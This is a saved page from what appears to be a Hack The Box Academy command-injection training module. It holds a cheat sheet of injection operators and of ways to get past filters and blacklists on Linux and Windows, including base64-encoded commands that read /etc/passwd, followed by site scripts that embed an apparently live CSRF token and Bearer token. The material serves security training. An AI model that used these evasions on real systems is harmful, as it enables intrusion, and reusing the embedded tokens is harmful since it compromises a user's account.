+<h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
+<p>The cheat sheet is as a useful command reference for this module.</p>
+<h2>Injection Operators</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><strong>Injection Operator</strong></th>
+<th><strong>Injection Character</strong></th>
+<th><strong>URL-Encoded Character</strong></th>
+<th><strong>Executed Command</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Semicolon</td>
+<td><code>;</code></td>
+<td><code>%3b</code></td>
+<td>Both</td>
+</tr>
+<tr>
+<td>New Line</td>
+<td><code>\n</code></td>
+<td><code>%0a</code></td>
+<td>Both</td>
+</tr>
+<tr>
+<td>Background</td>
+<td><code>&amp;</code></td>
+<td><code>%26</code></td>
+<td>Both (second output generally shown first)</td>
+</tr>
+<tr>
+<td>Pipe</td>
+<td><code>|</code></td>
+<td><code>%7c</code></td>
+<td>Both (only second output is shown)</td>
+</tr>
+<tr>
+<td>AND</td>
+<td><code>&amp;&amp;</code></td>
+<td><code>%26%26</code></td>
+<td>Both (only if first succeeds)</td>
+</tr>
+<tr>
+<td>OR</td>
+<td><code>||</code></td>
+<td><code>%7c%7c</code></td>
+<td>Second (only if first fails)</td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td><code>``</code></td>
+<td><code>%60%60</code></td>
+<td>Both (Linux-only)</td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td><code>$()</code></td>
+<td><code>%24%28%29</code></td>
+<td>Both (Linux-only)</td>
+</tr>
+</tbody>
+</table></div>
+<hr>
+<h1>Linux</h1>
+<h2>Filtered Character Bypass</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>printenv</code></td>
+<td>Can be used to view all environment variables</td>
+</tr>
+<tr>
+<td><strong>Spaces</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%09</code></td>
+<td>Using tabs instead of spaces</td>
+</tr>
+<tr>
+<td><code>${IFS}</code></td>
+<td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td>
+</tr>
+<tr>
+<td><code>{ls,-la}</code></td>
+<td>Commas will be replaced with spaces</td>
+</tr>
+<tr>
+<td><strong>Other Characters</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>${PATH:0:1}</code></td>
+<td>Will be replaced with <code>/</code></td>
+</tr>
+<tr>
+<td><code>${LS_COLORS:10:1}</code></td>
+<td>Will be replaced with <code>;</code></td>
+</tr>
+<tr>
+<td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
+<td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td>
+</tr>
+</tbody>
+</table></div>
+<hr>
+<h2>Blacklisted Command Bypass</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Character Insertion</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>'</code> or <code>"</code></td>
+<td>Total must be even</td>
+</tr>
+<tr>
+<td><code>$@</code> or <code>\</code></td>
+<td>Linux only</td>
+</tr>
+<tr>
+<td><strong>Case Manipulation</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code></td>
+<td>Execute command regardless of cases</td>
+</tr>
+<tr>
+<td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
+<td>Another variation of the technique</td>
+</tr>
+<tr>
+<td><strong>Reversed Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo 'whoami' | rev</code></td>
+<td>Reverse a string</td>
+</tr>
+<tr>
+<td><code>$(rev&lt;&lt;&lt;'imaohw')</code></td>
+<td>Execute reversed command</td>
+</tr>
+<tr>
+<td><strong>Encoded Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td>
+<td>Encode a string with base64</td>
+</tr>
+<tr>
+<td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
+<td>Execute b64 encoded string</td>
+</tr>
+</tbody>
+</table></div>
+<hr>
+<h1>Windows</h1>
+<h2>Filtered Character Bypass</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-ChildItem Env:</code></td>
+<td>Can be used to view all environment variables - (PowerShell)</td>
+</tr>
+<tr>
+<td><strong>Spaces</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%09</code></td>
+<td>Using tabs instead of spaces</td>
+</tr>
+<tr>
+<td><code>%PROGRAMFILES:~10,-5%</code></td>
+<td>Will be replaced with a space - (CMD)</td>
+</tr>
+<tr>
+<td><code>$env:PROGRAMFILES[10]</code></td>
+<td>Will be replaced with a space - (PowerShell)</td>
+</tr>
+<tr>
+<td><strong>Other Characters</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%HOMEPATH:~0,-17%</code></td>
+<td>Will be replaced with <code>\</code> - (CMD)</td>
+</tr>
+<tr>
+<td><code>$env:HOMEPATH[0]</code></td>
+<td>Will be replaced with <code>\</code> - (PowerShell)</td>
+</tr>
+</tbody>
+</table></div>
+<hr>
+<h2>Blacklisted Command Bypass</h2>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Character Insertion</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>'</code> or <code>"</code></td>
+<td>Total must be even</td>
+</tr>
+<tr>
+<td><code>^</code></td>
+<td>Windows only (CMD)</td>
+</tr>
+<tr>
+<td><strong>Case Manipulation</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>WhoAmi</code></td>
+<td>Simply send the character with odd cases</td>
+</tr>
+<tr>
+<td><strong>Reversed Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>"whoami"[-1..-20] -join ''</code></td>
+<td>Reverse a string</td>
+</tr>
+<tr>
+<td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
+<td>Execute reversed command</td>
+</tr>
+<tr>
+<td><strong>Encoded Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
+<td>Encode a string with base64</td>
+</tr>
+<tr>
+<td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
+<td>Execute b64 encoded string</td>
+</tr>
+</tbody>
+</table></div>
+</div>
+</div>
+<div class="modal-footer">
+<a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/109">Download Cheatsheet</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer class="footer">
+<div class="container-fluid">
+<div class="row">
+<div class="col-sm-6">
+</div>
+<div class="col-sm-6">
+<div class="text-sm-right d-none d-sm-block">
+Powered by &nbsp; <a href="https://www.hackthebox.com/" target="_blank"><img style="margin-bottom: 1px;" src="./Command Injections9_files/logo-htb.svg" height="20px"></a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</div>
+</div>
+</div>
+<script src="./Command Injections9_files/jquery.min.js.download"></script>
+<script src="./Command Injections9_files/bootstrap.bundle.min.js.download"></script>
+<script src="./Command Injections9_files/metisMenu.min.js.download"></script>
+<script src="./Command Injections9_files/simplebar.min.js.download"></script>
+<script src="./Command Injections9_files/waves.min.js.download"></script>
+<script src="./Command Injections9_files/toastr.min.js.download"></script>
+<script src="./Command Injections9_files/axios.min.js.download"></script>
+<script src="./Command Injections9_files/prism.js.download"></script>
+<script src="./Command Injections9_files/main.js.download"></script>
+<script>
+    axios.defaults.headers.common = {
+        'X-CSRF-TOKEN': 'OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Authorization': 'Bearer ' + 'jgfghW9jOUxTYrPOMG9i2ujbtUFdtKuilcFrKtLWJpv9gAzKxNnjcsm7Dg2wIx8ivYvDBp7jCWD5XRNP'
+    };
+</script>
+<script>
+    $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');
+
+    $('.training-module a').attr('target','_blank').attr('rel','noopener nofollow');
+
+    $( ".favouriteBtn" ).click(function() {
+        let id = $(this).data('module-id');
+
+        axios.get('/api/modules/favourite/'+id).then(response => {
+            let data = response.data;
+            if (data.fav === 1) {
+                $(this).removeClass('far fa').addClass('fa');
+                toastr["success"](data.message, "Success");
+            } else {
+                $(this).removeClass('far fa').addClass('far');
+                toastr["success"](data.message, "Success");
+            }
+        });
+    });
+
+    function encode_utf8(string) {
+    return unescape(encodeURIComponent(string));
+  }
+
+  $('.btnAnswer').click(function() {
+    let question_id = $(this).data('question-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
+    axios.post('/api/check/answer', {
+      answer: btoa(utf8EncodedString),
+      question_id: question_id
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $('#answer' + question_id).attr('disabled', 1);
+        $('#answer' + question_id).addClass('text-success');
+        $('#hintBtn' + question_id).attr('disabled', 1);
+        toastr['success'](data.message, 'Success');
+        completeCheck();
+      }
+    });
+  });
+
+  $('.btnAnswerExercise').click(function() {
+    let exercise_id = $(this).data('exercise-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
+    axios.post(`/api/check/exercise/${exercise_id}/answer`, {
+      answer: btoa(utf8EncodedString)
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
+        toastr['success'](data.message, 'Success');
+      }
+    });
+  });
+
+    
+    $('.reveal-modal').click(e => {
+        let id = $(e.target).data('exercise-id');
+        $(`#revealExerciseAnswer${id}`).modal('hide');
+    });
+
+    $( document ).ready(function() {
+
+        $('pre').filter(function () {
+            return this.className.match(/\blanguage-/);
+        }).each(function () {
+            let heading = $(this).prevAll().closest('h4').last().text();
+
+            if (this.className === ' language-shell-session') {
+                wrapTerminal(this, heading);
+            } else if (this.className === ' language-powershell-session') {
+                wrapPSTerminal(this, heading);
+            } else if (this.className === ' language-cmd-session') {
+                wrapCMDTerminal(this, heading);
+            } else if (this.className.startsWith(' language-')) {
+                var language = this.className.split('-').pop();
+                wrapCodeBlock(this,language);
+            }
+        });
+
+        wrapBrowser($('.website-screenshot'));
+        completeCheck();
+
+        $("span:contains('[!bash!]')").html('<span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span>');
+    });
+
+    function completeCheck()
+    {
+        axios.get('/api/check/complete/1039').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                if (data.completed === true) {
+                    $('#completeBtn').show();
+                }
+            }
+        });
+    }
+
+    function wrapTerminal(element, heading)
+    {
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapPSTerminal(element, heading)
+    {
+        $(element).css('background', '#012456').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCMDTerminal(element, heading)
+    {
+        $(element).css('background', 'black').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCodeBlock(element,lang)
+    {
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend('<div class="window_top">Code: <span class="text-success">'+lang+'</div>');
+    }
+    function wrapBrowserOld(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+        let url = element.data('url');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <input type="text" class="website-screenshot-url" disabled value="${url}">
+                    <span class="float-right"><i class="fa fa-home"></i></span>
+                </div>
+            `);
+    }
+    function wrapBrowser(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+
+        $(element).each( function(index,e) {
+            let url = $(e).data('url');
+            $(e).wrap('<div class="window_content"></div>')
+                .parent().wrap('<div class="window_container"></div>')
+                .prepend(`
+                    <div class="window_top">
+                        <span class="mr-2">
+                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
+                        </span>
+                        <input type="text" class="website-screenshot-url" disabled value="${url}">
+                        <span class="float-right"><i class="fa fa-bars"></i></span>
+                    </div>
+                `);
+        })
+    }
+</script>
+<script type="module">
+    import RFB from '/assets/libs/vnc/core/rfb.js';
+
+    let rfb;
+    let sidePreview;
+    let desktopName;
+    let pwnboxActive = false;
+
+    function connectedToServer(e) {
+        status("Connected to " + desktopName);
+        $('.fullScreenBtn').show();
+        $('.resetInstanceBtn').show();
+        $('.terminateInstanceBtn').show();
+        $('.extendInstanceBtn').show();
+        $('.instanceLoading').hide();
+        $('.instanceStart').hide();
+        $('.resetInstanceBtn').prop('disabled',false);
+        $('.fullScreenBtn').prop('disabled',false);
+        $('.extendInstanceBtn').prop('disabled',false);
+        $('.terminateInstanceBtn').prop('disabled',false);
+
+        document.querySelector('canvas').addEventListener('focus', (event) => {
+            navigator.clipboard.readText()
+                .then(text => {
+                    writeToClipboard(text);
+                })
+                .catch(err => {
+                    console.log('Something went wrong while accessing clipboard', err);
+                })
+        });
+
+    }
+
+    function disconnectedFromServer(e) {
+        status("Disconnected");
+        $('.screenPlaceholder').show();
+        stopCountdown();
+    }
+
+    function clipboardReceived(e) {
+        navigator.clipboard.writeText(e.detail.text)
+            .then(() => {
+                // Success!
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    }
+
+    function updateDesktopName(e) {
+        desktopName = e.detail.name;
+    }
+
+    function status(text) {
+        console.log(text);
+        $("#statusText").html(text);
+    }
+
+    function readQueryVariable(name) {
+        const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
+            match = document.location.href.match(re);
+
+        if (match) {
+            return decodeURIComponent(match[1]);
+        }
+
+        return null;
+    }
+
+    function writeToClipboard(text) {
+        rfb.clipboardPasteFrom(text);
+    }
+
+    let host = '';
+    let password = '';
+    let countdown = '';
+    let targetCountdown = '';
+    let url= '';
+    let spawnInterval = null;
+
+    function getPwnbox() {
+        axios.get('/api/get/pwnbox').then(response => {
+            let data = response.data;
+
+            if (spawnInterval !== null && data.instance.action_log !== null) {
+                let error = data.instance.action_log.find(log => log.error === true);
+                if (error) {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+
+                    clearInterval(spawnInterval);
+                    disconnectedFromServer();
+
+                    let errorMessage = `${error.text}. Please contact support.`;
+                    toastr["error"](errorMessage, "Error");
+
+                    status(errorMessage);
+                    return;
+                }
+            }
+
+            if (data.success === 1 && data.instance.vnc_password !== null) {
+                if (data.instance.action_log.find(log => log.action === 'ready')) {
+                    host = 'proxy-uk.htb-cloud.com/bird/' + data.instance.hostname;
+                    password = data.instance.vnc_password;
+                    $('.lifeLeft').html(data.instance.life_remaining);
+                    startCountdown();
+                    $('.screenPlaceholder').hide();
+                    url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
+                    pwnboxActive = true;
+                    connect();
+
+                    if (spawnInterval !== null) {
+                        clearInterval(spawnInterval);
+                    }
+                }
+            } else {
+                $('.screenPlaceholder').show();
+            }
+
+        });
+    }
+
+        function extendPwnbox() {
+        axios.get('/api/extend/pwnbox').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.lifeLeft').html(data.instance.life_remaining);
+                stopCountdown();
+                startCountdown();
+                toastr["success"]("Time extended for 60 minutes.", "Success");
+            } else {
+                toastr["error"](data.message, "Error");
+            }
+
+        });
+    }
+    
+    getPwnbox();
+
+    function startCountdown() {
+        countdown = setInterval(function() {
+            let life = parseInt($('.lifeLeft').html()) -1;
+            $('.lifeLeft').html(life)
+        }, 60 * 1000);
+    }
+
+    function stopCountdown() {
+        clearInterval(countdown);
+    }
+
+    function terminatePwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+
+        $('.instanceTerminating').show();
+
+        status('Terminating Interactive Instance...');
+
+        axios.delete('/api/terminate/pwnbox')
+            .then(({ data }) => {
+                if (data.success === 1) {
+                    $('.startInstanceBtn').show();
+                    $('.instanceStart').show();
+                    $('.instanceTerminating').hide();
+                    $('.resetInstanceBtn').hide();
+                    $('.terminateInstanceBtn').hide();
+                    $('.fullScreenBtn').hide();
+                    $('.extendInstanceBtn').hide();
+
+                    pwnboxActive = false;
+
+                    toastr['success']('Instance has been terminated.', 'Success');
+                } else {
+                    toastr['error'](data.message, 'Error');
+                    connect();
+                    $('.resetInstanceBtn').prop("disabled", false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                }
+            });
+    }
+
+    function startPwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+        $('.instanceLoading').show();
+        $('.startInstanceBtn').hide();
+
+        status("Starting Interactive Instance...");
+
+        grecaptcha.ready(function() {
+            grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', {action: 'spawnPwnbox'}).then(function(token) {
+                if (token) {
+                    axios.get('/api/spawn/pwnbox?g-recaptcha-response= '+token).then(response => {
+                        let data = response.data;
+                        if (data.success === 1) {
+                            spawnInterval = setInterval(() => {
+                                getPwnbox();
+                            }, 2000);
+                        } else {
+                            if(data.code === 1 || (data.code === 3 && pwnboxActive)) {
+                                $('.resetInstanceBtn').prop("disabled", false);
+                                $('.fullScreenBtn').prop('disabled',false);
+                                $('.extendInstanceBtn').prop('disabled',false);
+                                $('.terminateInstanceBtn').prop('disabled',false);
+                                connect();
+
+                                if (data.code === 3) {
+                                    $('.instanceLoading').hide();
+                                    startCountdown();
+                                }
+                            } else {
+                                $('.startInstanceBtn').show();
+                                $('.instanceStart').show();
+                                $('.instanceLoading').hide();
+                            }
+
+                            toastr["error"](data.message, "Error");
+                        }
+
+                    });
+                } else {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+                }
+            });
+        });
+    }
+
+    $('.fullScreenBtn').click(function() {
+        window.open(url, "_blank");
+    });
+
+    $('.startInstanceBtn').click(function() {
+        startPwnbox();
+                spawnTarget();
+            });
+
+    $('.resetInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                sidePreview.disconnect();
+        startPwnbox();
+    });
+
+    $('.terminateInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                sidePreview.disconnect();
+        terminatePwnbox();
+    });
+
+    $('.extendInstanceBtnClicker').click(function() {
+       extendPwnbox();
+    });
+
+    $('.resetTargetBtn').click(function(){
+        $(this).prop('disabled',true);
+                    spawnDocker();
+                    });
+
+    function connect() {
+        status("Connecting to " + host.split('/')[2] + "...");
+
+        
+        sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
+            { credentials: { password: password } });
+
+        sidePreview.addEventListener("connect",  connectedToServer);
+        sidePreview.addEventListener("disconnect", disconnectedFromServer);
+
+        sidePreview.resizeSession = false;
+        sidePreview.viewOnly = true;
+        sidePreview.scaleViewport = true;
+    }
+
+    $('.target, .targetIp').click(e => {
+        if ($('.resetTargetBtn').is(':hidden')) return;
+        navigator.clipboard.writeText($(e.target).html())
+            .then(() => {
+                toastr['success']('Target copied to clipboard', 'Success');
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    });
+
+        $('.spawnTargetBtn').click(function() {
+        spawnDocker();
+    })
+
+    function spawnDocker() {
+        $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
+        axios.get('/api/spawn/container/1039').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.target').html(data.instance.hostname+":"+data.instance.port);
+                $('.targetIp').html(data.instance.hostname);
+                $('.resetTargetBtn').show();
+                $('.resetTargetBtn').prop('disabled',false);
+                $('.targetLifeTimeContainer').show();
+                $('.targetLifeTime').html(90);
+                startTargetCountdown();
+            } else {
+                toastr["error"]("Target failed to spawn. Please try refreshing the page.", "Error");
+                $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target failed to spawn :(');
+                $('.resetTargetBtn').prop('disabled',false);
+            }
+        });
+    }
+        
+    function startTargetCountdown() {
+        targetCountdown = setInterval(function() {
+            let life = parseInt($('.targetLifeTime').html()) -1;
+            $('.targetLifeTime').html(life)
+            if (life == 0) {
+                $('.targetLifeTimeContainer').hide();
+            }
+        }, 60 * 1000);
+    }
+</script>
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./Command Injections9_files/anchor.html" width="256" height="60" role="presentation" name="a-6y37x1cnufbo" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./Command Injections9_files/saved_resource.html"></iframe></div><div id="torrent-scanner-popup" style="display: none;"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./Command Injections9_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg viewBox="0 0 16 14" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z"></path></svg></div></div><style id="intercom-lightweight-app-style" type="text/css">
+  @keyframes intercom-lightweight-app-launcher {
+    from {
+      opacity: 0;
+      transform: scale(0.5);
+    }
+    to {
+      opacity: 1;
+      transform: scale(1);
+    }
+  }
+
+  @keyframes intercom-lightweight-app-gradient {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+
+  @keyframes intercom-lightweight-app-messenger {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .intercom-lightweight-app {
+    position: fixed;
+    z-index: 2147483001;
+    width: 0;
+    height: 0;
+    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
+  }
+
+  .intercom-lightweight-app-gradient {
+    position: fixed;
+    z-index: 2147483002;
+    width: 500px;
+    height: 500px;
+    bottom: 0;
+    right: 0;
+    pointer-events: none;
+    background: radial-gradient(
+      ellipse at bottom right,
+      rgba(29, 39, 54, 0.16) 0%,
+      rgba(29, 39, 54, 0) 72%);
+    animation: intercom-lightweight-app-gradient 200ms ease-out;
+  }
+
+  .intercom-lightweight-app-launcher {
+    position: fixed;
+    z-index: 2147483003;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #85C700;
+    cursor: pointer;
+    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
+    animation: intercom-lightweight-app-launcher 250ms ease;
+  }
+
+  .intercom-lightweight-app-launcher:focus {
+    outline: none;
+    
+  }
+
+  .intercom-lightweight-app-launcher-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 60px;
+    height: 60px;
+    transition: transform 100ms linear, opacity 80ms linear;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg {
+    width: 28px;
+    height: 32px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg {
+    height: 56px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-custom-icon-open {
+    max-height: 36px;
+    max-width: 36px;
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize {
+    
+        opacity: 0;
+        transform: rotate(-60deg) scale(0);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg {
+    width: 16px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-messenger {
+    position: fixed;
+    z-index: 2147483003;
+    overflow: hidden;
+    background-color: white;
+    animation: intercom-lightweight-app-messenger 250ms ease-out;
+    
+        width: 376px;
+        height: calc(100% - 120px);
+        max-height: 704px;
+        min-height: 250px;
+        right: 20px;
+        bottom: 100px;
+        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
+        border-radius: 8px;
+      
+  }
+
+  .intercom-lightweight-app-messenger-header {
+    height: 75px;
+    background: linear-gradient(
+      135deg,
+      rgb(17, 25, 39) 0%,
+      rgb(0, 0, 0) 100%
+    );
+  }
+
+  @media print {
+    .intercom-lightweight-app {
+      display: none;
+    }
+  }
+</style></div><img src="./Command Injections9_files/adsct" height="1" width="1" style="display: none;"><img src="./Command Injections9_files/adsct(1)" height="1" width="1" style="display: none;"></body></html>
